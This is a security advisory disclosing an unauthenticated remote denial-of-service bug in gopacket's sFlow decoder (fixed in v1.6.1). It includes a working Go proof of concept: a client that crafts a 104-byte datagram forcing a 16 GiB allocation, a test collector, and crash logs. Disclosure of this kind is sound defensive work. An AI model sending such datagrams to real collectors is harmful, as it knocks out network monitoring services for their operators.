# [M] GoPacket's sFlow ExtendedGatewayFlow decoder: unbounded attacker-controlled allocation (104-byte UDP datagram -> up to 16 GiB make) -> unauthenticated remote DoS

## Summary
Severity: Medium
Advisory: GHSA-g6v3-7xmc-w563
CVE: CVE-2026-54332
CWE: CWE-770
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-g6v3-7xmc-w563
Type: github-advisory

## Affected
- Go: `github.com/gopacket/gopacket` — affected >=0 <1.6.1

## Details
## Summary

The sFlow `ExtendedGatewayFlow` record decoder in `github.com/gopacket/gopacket` allocates a slice with `make([]uint32, n)` where `n` is an attacker-controlled 32-bit wire field that has no upper bound. Because the allocation happens *before* the read loop that would consume the corresponding bytes, a single small UDP datagram can force a multi-gigabyte allocation. A 104-byte sFlow datagram can request up to 16 GiB and OOM-kill any service that parses sFlow with gopacket. This is an unauthenticated remote denial of service (CWE-770).

## Root cause (file:line @ v1.6.0)

Two sinks in `layers/sflow.go`, both in the `ExtendedGatewayFlow` (record type 1003) decode path:

1. `layers/sflow.go:1306` in `decodeExtendedGatewayFlowRecord`:
```go
*data, communitiesLength = (*data)[4:], binary.BigEndian.Uint32((*data)[:4])
eg.Communities = make([]uint32, communitiesLength)   // communitiesLength is a raw wire uint32, no bound
for j := uint32(0); j < communitiesLength; j++ { ... }
```

2. `layers/sflow.go:1276` in `decodePath` (a helper called from the same record decoder):
```go
*data, ad.Count = (*data)[4:], binary.BigEndian.Uint32((*data)[:4])
ad.Members = make([]uint32, ad.Count)                // ad.Count is a raw wire uint32, no bound
for i := uint32(0); i < ad.Count; i++ { ... }
```

In both cases the `make` is executed before the loop that reads the element bytes, so the allocation size is fully determined by the attacker-supplied count field and is never checked against the number of bytes actually remaining in the packet. `communitiesLength = 0xFFFFFFFF` requests `make([]uint32, 4294967295)` = 16,384 MB (16 GiB).

## Reachability (remote attacker -> sink)

The registered `LayerTypeSFlow` decoder parses sFlow datagrams from the wire:

`SFlowDatagram.DecodeFromBytes` (sflow.go:302) -> `SampleCount` loop -> `decodeFlowSample(expanded=false)` (sflow.go:458) -> `RecordCount` loop -> record format 1003 `SFlowTypeExtendedGatewayFlow` (sflow.go:573) -> `decodeExtendedGatewayFlowRecord` (sflow.go:1284) -> sink at line 1306 (and line 1276 via the `ASPath` -> `decodePath` branch).

sFlow is a UDP-based network-telemetry protocol; collectors built on gopacket process datagrams sent (or forwarded by switches/routers) from the network. No authentication is involved, so any host that can deliver a UDP packet to such a collector can trigger the sink. The same record reached via `gopacket.NewPacket(data, LayerTypeSFlow, gopacket.Default)` is equally affected.

## Impact

Unauthenticated remote denial of service via memory exhaustion. A single 104-byte datagram drives an allocation of up to 16 GiB, OOM-killing the parsing process. There is no memory corruption and no code execution — the impact is process termination / resource exhaustion. Severity assessed as Medium (unauthenticated remote DoS, no memory-safety violation).

## Proof of Concept

This PoC is an end-to-end test against a real deployed sFlow collector. A minimal
but realistic UDP collector (built on the public gopacket API, exactly as a real
network-telemetry collector would be) runs inside a hard-capped 256 MB container;
an independent client process sends a real malicious sFlow datagram over a real
UDP socket; the collector process is then observed to die. A benign datagram is
used as a negative control.

The harness pins `github.com/gopacket/gopacket@v1.6.0` (the sink is confirmed at
the v1.6.0 tag, `layers/sflow.go:1306`).

### Collector (real UDP sFlow collector)

```go
// collector.go — binds a UDP socket and, for every datagram, builds a
// gopacket.Packet rooted at LayerTypeSFlow and accesses the layer, which drives
// the registered sFlow decoder over the attacker-controlled bytes.
package main

import (
	"fmt"
	"net"
	"os"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
)

func main() {
	udpAddr, _ := net.ResolveUDPAddr("udp4", "0.0.0.0:6343")
	conn, err := net.ListenUDP("udp4", udpAddr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "listen error: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()
	fmt.Printf("[collector] sFlow collector listening on udp %s\n", conn.LocalAddr())

	buf := make([]byte, 65535)
	for {
		n, src, err := conn.ReadFromUDP(buf)
		if err != nil {
			continue
		}
		datagram := make([]byte, n)
		copy(datagram, buf[:n])
		fmt.Printf("[collector] received %d-byte datagram from %s\n", n, src)
		pkt := gopacket.NewPacket(datagram, layers.LayerTypeSFlow, gopacket.Default)
		if dg, ok := pkt.Layer(layers.LayerTypeSFlow).(*layers.SFlowDatagram); ok {
			fmt.Printf("[collector] decoded sFlow datagram: version=%d samples=%d flowSamples=%d\n",
				dg.DatagramVersion, dg.SampleCount, len(dg.FlowSamples))
		} else {
			fmt.Printf("[collector] no sFlow layer decoded\n")
		}
	}
}
```

### Client (independent process, real UDP socket, no gopacket dependency)

The client crafts a well-formed sFlow v5 datagram with one FlowSample carrying
one ExtendedGatewayFlow (record type 1003) record and sets only its
`communitiesLength` field. For the benign case it appends real community words
plus the trailing LocalPref word so the record decodes cleanly.

```go
// client.go — usage: client <addr> <communitiesLength> [--benign]
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strconv"
)

func u32(b *[]byte, v uint32) {
	t := make([]byte, 4)
	binary.BigEndian.PutUint32(t, v)
	*b = append(*b, t...)
}

func buildDatagram(commLen uint32, benign bool) []byte {
	var d []byte
	u32(&d, 5); u32(&d, 1); u32(&d, 0x7f000001); u32(&d, 0); u32(&d, 0); u32(&d, 0)
	u32(&d, 1)           // SampleCount = 1
	u32(&d, 1)           // sample format -> FlowSample
	u32(&d, 0); u32(&d, 0); u32(&d, 0); u32(&d, 0); u32(&d, 0); u32(&d, 0); u32(&d, 0); u32(&d, 0)
	u32(&d, 1)           // RecordCount = 1
	u32(&d, 1003)        // record format -> ExtendedGatewayFlow
	u32(&d, 0)           // FlowDataLength
	u32(&d, 1)           // gateway address type = IPv4
	u32(&d, 0x08080808)  // NextHop
	u32(&d, 0); u32(&d, 0); u32(&d, 0)
	u32(&d, 0)           // ASPathCount = 0
	u32(&d, commLen)     // communitiesLength -> make([]uint32, commLen) sink
	if benign {
		for i := uint32(0); i < commLen; i++ {
			u32(&d, 0xABCD0000+i)
		}
		u32(&d, 100) // trailing LocalPref word
	}
	return d
}

func main() {
	addr := os.Args[1]
	commLen, _ := strconv.ParseUint(os.Args[2], 10, 32)
	benign := len(os.Args) > 3 && os.Args[3] == "--benign"
	data := buildDatagram(uint32(commLen), benign)
	raddr, _ := net.ResolveUDPAddr("udp", addr)
	conn, _ := net.DialUDP("udp", nil, raddr)
	defer conn.Close()
	conn.Write(data)
	fmt.Printf("[client] sent %d-byte sFlow datagram (communitiesLength=%d, benign=%v)\n",
		len(data), commLen, benign)
}
```

### Run and observed result

The collector runs under a hard 256 MB cgroup cap with swap disabled
(`--memory=256m --memory-swap=256m`) so the OOM is contained to the cgroup and
the host is unaffected.

Negative control (benign datagram, `communitiesLength=4`):

```
$ docker run --rm --network sflow-net sflow-client-e2e sflow-e2e:6343 4 --benign
[client] sent 124-byte sFlow datagram (communitiesLength=4, benign=true)

# collector log:
[collector] received 124-byte datagram from 172.18.0.3:56438
[collector] decoded sFlow datagram: version=5 samples=1 flowSamples=1
# collector status: Up (ALIVE); RSS flat at 1.5 MiB
```

Attack (single malicious datagram, `communitiesLength=0xFFFFFFFF`):

```
$ docker run --rm --network sflow-net sflow-client-e2e sflow-e2e:6343 4294967295
[client] this datagram instructs the decoder to make([]uint32, 4294967295) = 16384 MB
[client] datagram sent over real UDP socket

# collector log (verbatim):
[collector] received 104-byte datagram from 172.18.0.3:42284
fatal error: runtime: out of memory

runtime stack:
runtime.throw(...)
runtime.sysMapOS(0x61585e800000, 0x400000000, ...)   // 0x400000000 = 16 GiB requested
runtime.makeslice(...)
	/usr/local/go/src/runtime/slice.go:117
github.com/gopacket/gopacket/layers.decodeExtendedGatewayFlowRecord(...)
	/go/pkg/mod/github.com/gopacket/gopacket@v1.6.0/layers/sflow.go:1306
github.com/gopacket/gopacket/layers.decodeFlowSample(...)
	/go/pkg/mod/github.com/gopacket/gopacket@v1.6.0/layers/sflow.go:574
github.com/gopacket/gopacket/layers.(*SFlowDatagram).DecodeFromBytes(...)
	/go/pkg/mod/github.com/gopacket/gopacket@v1.6.0/layers/sflow.go:321
github.com/gopacket/gopacket.NewPacket(...)
	/go/pkg/mod/github.com/gopacket/gopacket@v1.6.0/packet.go:767
main.main()
	/src/collector.go:54

# container final state:
Status=exited OOMKilled=false ExitCode=2
```

A single 104-byte UDP datagram, delivered over a real socket to a real
gopacket-based collector, terminates the collector process. The Go runtime tries
to `sysMapOS` 0x400000000 (16 GiB) into the 256 MB cgroup, the mapping is denied,
and the runtime aborts with `fatal error: runtime: out of memory` (exit 2). The
full attacker -> sink call stack is captured: `collector.go:54`
(`gopacket.NewPacket`) -> `SFlowDatagram.DecodeFromBytes` -> `decodeFlowSample`
(sflow.go:574) -> `decodeExtendedGatewayFlowRecord` (sflow.go:1306) ->
`makeslice` -> fatal OOM. The benign control on the same collector decodes
cleanly and the process stays alive with flat RSS, confirming the
attacker-controlled `communitiesLength` field is what drives the allocation.

The host is unaffected throughout: the allocation is contained by the 256 MB
cgroup cap (no swap), and host swap stayed above 900 MB free across the run.

## Affected versions

`github.com/gopacket/gopacket` <= v1.6.0 (v1.6.0 is the latest release; HEAD == tag). Earlier versions carrying the same `layers/sflow.go` decode code are affected as well.

## Suggested fix

Before each `make([]uint32, n)`, validate `n` against the number of bytes actually remaining in the datagram. Each element consumes 4 bytes on the wire, so a correct upper bound is `remaining_bytes / 4`; any count larger than that cannot be backed by real packet data and should be rejected with a decode error (matching the existing `errors.New` / `fmt.Errorf` error style in this file), rather than pre-allocating. This caps the allocation at roughly the datagram size and eliminates the amplification:

- `decodeExtendedGatewayFlowRecord`: reject when `communitiesLength > uint32(len(*data)/4)` before `make([]uint32, communitiesLength)`.
- `decodePath`: reject when `ad.Count > uint32(len(*data)/4)` before `make([]uint32, ad.Count)`, and propagate the error to the caller.

I will follow up with a fix PR via the advisory's private fork.

## References

- sFlow Version 5 specification (https://sflow.org/sflow_version_5.txt), section on the extended_gateway flow_data record (communities / dst_as_path lists).
- CWE-770: Allocation of Resources Without Limits or Throttling.

## References
- https://github.com/gopacket/gopacket/security/advisories/GHSA-g6v3-7xmc-w563
- https://github.com/gopacket/gopacket/commit/76119086f5936aacd7088bdf97d565501bb6c4cc
- https://github.com/gopacket/gopacket
- https://github.com/gopacket/gopacket/releases/tag/v1.6.1
